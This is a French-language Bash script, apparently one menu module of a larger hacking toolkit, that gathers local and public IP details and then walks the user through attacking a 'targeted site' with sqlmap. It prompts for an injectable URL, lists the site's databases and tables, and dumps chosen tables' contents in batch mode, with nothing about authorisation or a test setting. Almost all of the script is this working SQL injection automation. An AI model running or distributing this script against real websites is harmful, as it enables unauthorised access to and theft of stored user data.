## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"

eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
IPeth0=`ifconfig $eth0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
IPwlan0=`ifconfig $wlan0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
if [ -z $wlan0 ];then
	if [ -z $IPeth0 ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`

trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../
./suite.sh
}

echo -e -n "$MAGENTA [>]$CYAN Entrez l'URL injectable de du site ciblé (http://www. ...) : $DEFAULT"
read cible

echo -e "$BLUE [...]$DEFAULT$CYAN Chargement (~ 30-60 s) ... $DEFAULT
"
echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Bases de données du site : $DEFAULT
"



sqlmap -u $cible --dbs --batch --threads 10 | grep "[*]" | grep -v " at "




echo -e -n "
$MAGENTA [>]$CYAN Entrez le nom de la base de donnée à injecter : $DEFAULT"
read database

echo -e "$BLUE [...]$DEFAULT$CYAN Chargement (~ 30-60 s) ... $DEFAULT
"
echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Tables de la base de donnée $database : $DEFAULT
"


sqlmap -u $cible -D $database --tables --threads 10 | grep -e "+---" -e "| " | grep -v "sqlmap" | grep -v "]"



echo -e -n "
$MAGENTA [>]$CYAN Entrez le nom de(s) la(les) table(s) de donnée à injecter (séparer par des virgules) : $DEFAULT"
read table

echo -e "$BLUE [...]$DEFAULT$CYAN Chargement (~ 30-60 s) ... $DEFAULT
"
echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Données de la table $table $database : $DEFAULT
"

attack=`sqlmap -u $cible -D $database -T $table --dump --threads 10 --batch | grep -e "+---" -e "| " | grep -v "sqlmap" | grep -v "]"`
echo "$attack"


echo -e -n "$MAGENTA [>]$CYAN Voulez-vous sauvegarder ce résultat ? (o/n) : $DEFAULT"
read ouinon



echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s



cd
cd $path/../
./suite.sh
